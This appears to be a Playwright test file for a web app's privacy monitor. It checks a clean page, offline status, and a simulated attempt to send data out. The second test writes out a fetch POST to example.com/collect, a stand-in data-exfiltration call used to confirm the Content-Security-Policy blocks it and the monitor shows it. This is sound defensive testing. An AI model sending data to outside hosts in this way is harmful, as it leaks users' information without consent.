// The activity monitor behind the privacy button: it reads the browser, so it must show a clean page as clean, catch an attempt
// to send data out (the Content-Security-Policy refuses it, the monitor still says it was tried), and show what is stored.
import { expect, test } from "@playwright/test";

const APP = "/APP-synthetic-data-generator/";

test("a clean page reads zero sent, zero to other websites, nothing saved", async ({ page }) => {
  await page.goto(APP);
  await page.getByRole("button", { name: "Stays on this device" }).click();
  const monitor = page.getByTestId("privacy-monitor");
  await expect(monitor.getByRole("heading", { name: "Your data stays on this device" })).toBeVisible();
  await expect(monitor.getByTestId("pm-sent")).toHaveText("0 B");
  await expect(monitor.getByTestId("pm-cross")).toHaveText("0");
  await expect(monitor.getByTestId("pm-log")).toContainText("Received");
  await monitor.getByRole("tab", { name: "Stored and held" }).click();
  await expect(monitor.getByTestId("pm-storage")).toContainText("Cookies");
  await expect(monitor.getByTestId("pm-storage").locator("dd").first()).toHaveText("0");
  await monitor.getByRole("tab", { name: "Safeguards" }).click();
  await expect(monitor.getByTestId("pm-policy")).toContainText("connect-src 'self'");
});

test("an attempt to send data to another site is refused and shown", async ({ page }) => {
  await page.goto(APP);
  await page.evaluate(async () => {
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "hello" });
    } catch {
      // the Content-Security-Policy refuses it
    }
  });
  await page.getByRole("button", { name: /Outside requests seen/ }).click();
  const monitor = page.getByTestId("privacy-monitor");
  await expect(monitor.getByRole("heading", { name: "Something tried to reach another address" })).toBeVisible();
  await expect(monitor.getByTestId("pm-sent")).toHaveText("5 B");
  await expect(monitor.getByTestId("pm-log")).toContainText("example.com/collect");
  await expect(monitor.getByTestId("pm-log")).toContainText("Sent");
});

test("the monitor says when the computer is offline, and the app keeps working", async ({ page, context }) => {
  await page.goto(APP);
  await page.getByRole("button", { name: "Stays on this device" }).click();
  await expect(page.getByTestId("pm-online")).toContainText("Online");
  await context.setOffline(true);
  await expect(page.getByTestId("pm-online")).toContainText("Offline");
  await context.setOffline(false);
});
